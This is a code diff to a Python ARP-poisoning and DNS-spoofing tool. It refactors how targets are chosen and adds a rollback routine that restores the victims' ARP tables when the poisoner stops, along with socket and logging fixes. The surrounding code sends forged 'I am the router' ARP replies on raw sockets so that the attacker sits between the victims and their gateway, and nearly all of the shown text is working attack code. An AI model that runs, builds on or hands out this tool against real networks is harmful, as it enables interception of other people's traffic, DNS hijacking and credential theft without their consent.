@@ -1208,7 +1208,10 @@ class ARPPoisoner(Thread):
 
   def stop(self):
     logger.info("ARP Poisonner stopping...", color=ARP_COLOR)
+    self.rollback()
     self.running = False
+    self.s.close()
+    self.device_socket.close()
     if self.is_alive():
       self.join()
     logger.info("ARP Poisonner stopped.", color=ARP_COLOR)
@@ -1219,20 +1222,19 @@ class ARPPoisoner(Thread):
       self.context.options.arp_elapse_time
     ))
     elevate_privilege()
-    s = socket.socket(
+    self.s = socket.socket(
       socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003)
     )
     lower_privilege()
     self.ctx = TmpCtx()
-    s.settimeout(1)
+    self.s.settimeout(1)
     while self.running:
       if self.context.options.router_mac is None:
         self.update_router_adress()
       self.ask_targets_mac()
       self.send_i_is_the_rooter()
       try:
-        ## we process packets until there are no packet anymore.
-        packet = s.recvfrom(65565)[0]
+        packet = self.s.recvfrom(65565)[0]
         packet = Layer4(packet)
         if packet.contains_arp:
           self.process_arp(packet)
@@ -1240,6 +1242,8 @@ class ARPPoisoner(Thread):
         pass
       except KeyboardInterrupt:
         self.stop()
+      except OSError:
+        arp_logger.warn("Bad socket state. Could not receive packet.")
 
   def init_tmp_ctx(self, packet):
     self.ctx.raw_target_ip = packet.arp_ip_target
@@ -1258,6 +1262,17 @@ class ARPPoisoner(Thread):
     self.ctx.raw_router_mac = pack(
       "!6B", *[int(x, 16) for x in self.ctx.router_mac.split(":")]
     )
+
+  def get_valid_targets(self):
+    targets = self.context.targets_ips
+    if targets is None:
+      return [(self.context.broadcast_ip, self.context.broadcast_mac)]
+    else:
+      return [
+        (target, self.context.arp_table.get(target, [self.context.broadcast_mac])[0])
+        #(target, self.context.arp_table.get(target, [None])[0])
+        for target in targets - {self.context.router_ip, self.context.ip}
+      ]
 
   def update_router_adress(self):
     ## we ask router's mac address once per hour.
@@ -1284,16 +1299,8 @@ class ARPPoisoner(Thread):
     )
 
   def send_targets_arp_query(self):
-    targets = self.context.targets_ips
-    if targets is None:
-      targets = [(self.context.broadcast_ip, self.context.broadcast_mac)]
-    else:
-      targets = [
-        (target, self.context.arp_table.get(target, self.context.broadcast_mac))
-        for target in targets - {self.context.router_ip, self.context.ip}
-      ]
     source = self.context.ip, self.context.mac
-    for target in targets:
+    for target in self.get_valid_targets():
       self.send_arp(source, target)
 
   def process_arp(self, packet):
@@ -1330,15 +1337,7 @@ class ARPPoisoner(Thread):
     if time.time() - self.last_send_i_is_the_rooter < self.context.options.arp_elapse_time:
       return
     self.last_send_i_is_the_rooter = time.time()
-    targets = self.context.targets_ips
-    if targets is None:
-      targets = [(self.context.broadcast_ip, self.context.broadcast_mac)]
-    else:
-      targets = [
-        (target, self.context.arp_table.get(target, [None])[0])
-        for target in targets - {self.context.router_ip, self.context.ip}
-      ]
-    for target in targets:
+    for target in self.get_valid_targets():
       self.tell_I_is_router_to(*target)
 
   def tell_I_is_router_to(self, ip, mac=None):
@@ -1357,9 +1356,21 @@ class ARPPoisoner(Thread):
         (self.context.ip, self.context.mac), (ip, self.context.broadcast_mac),
       )
 
+  def rollback(self):
+    arp_logger.info("ARP Poisoner is reversing his evil...")
+    for target in self.get_valid_targets():
+      self.send_arp(
+        (self.context.ip, self.context.mac),
+        target,
+        fake_mac=self.context.router_mac,
+        kind="response"
+      )
+
   def send_arp(self, source, target, fake_mac=None, kind="query"):
     ip_source, mac_source = source
     ip_target, mac_target = target
+    if mac_target is None:
+      mac_target = self.context.broadcast_mac
     arp_logger.info(
       "Sending ARP %s to %s[%s] as %s[%s]." % (
         kind,
@@ -1536,7 +1547,7 @@ class DNSSpoofer(object):
     self.device_socket.send(packet.raw_data)
 
   def stop(self):
-    print(DNS_COLOR+"DNS Spoofer stopping..."+NO_COLOR)
+    dns_logger.info("DNS Spoofer stopping...")
     self.running = False
 
 
@@ -1719,9 +1730,9 @@ def parse_arguments():
     parser.parse_args(["-h"])
   return Context(*arguments, options)
 
-def match_ipv4 (ip):
+def match_ipv4(ip):
   """ Test if the given ip is IPV4 """
-  return re.match (
+  return re.match(
     "^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)." \
     "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)." \
     "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)." \
@@ -1729,9 +1740,9 @@ def match_ipv4 (ip):
     ip
   ) is not None
 
-def match_ipv6 (ip):
+def match_ipv6(ip):
   """ Test if the given ip is IPV6 """
-  return re.match (
+  return re.match(
     "^((([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4})|" \
     "(([0-9A-Fa-f]{1,4}:){6}:[0-9A-Fa-f]{1,4})|" \
     "(([0-9A-Fa-f]{1,4}:){5}:([0-9A-Fa-f]{1,4}:)?[0-9A-Fa-f]{1,4})|" \
@@ -1750,9 +1761,9 @@ def match_ipv6 (ip):
     ip
   ) is not None
 
-def match_mac (mac):
+def match_mac(mac):
   """ Test if the given ip is a MAC """
-  return re.match (
+  return re.match(
     "^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$",
     mac
   ) is not None
@@ -1795,7 +1806,7 @@ if __name__ == "__main__":
   # we will upper privilege only when needed.
   lower_privilege()
 
-  logging.basicConfig(format="[%(levelname)-10s] %(message)s", level=logging.DEBUG)
+  logging.basicConfig(format="[%(levelname)-11s] %(message)s", level=logging.DEBUG)
   logger = logging.getLogger(os.path.basename(__file__))
   color_logger(logger)
   logger.critical = attach_critical_callback(logger.critical)
@@ -1805,12 +1816,12 @@ if __name__ == "__main__":
   arp_logger.propagate = False
   dns_sh = logging.StreamHandler()
   dns_sh.setFormatter(logging.Formatter(
-    DNS_COLOR+"[DNS-%(levelname)-6s] %(message)s"+NO_COLOR
+    DNS_COLOR+"[DNS-%(levelname)-7s] %(message)s"+NO_COLOR
   ))
   dns_logger.addHandler(dns_sh)
   arp_sh = logging.StreamHandler()
   arp_sh.setFormatter(logging.Formatter(
-    ARP_COLOR+"[ARP-%(levelname)-6s] %(message)s"+NO_COLOR
+    ARP_COLOR+"[ARP-%(levelname)-7s] %(message)s"+NO_COLOR
   ))
   arp_logger.addHandler(arp_sh)
   color_logger(dns_logger, overall_color=DNS_COLOR)
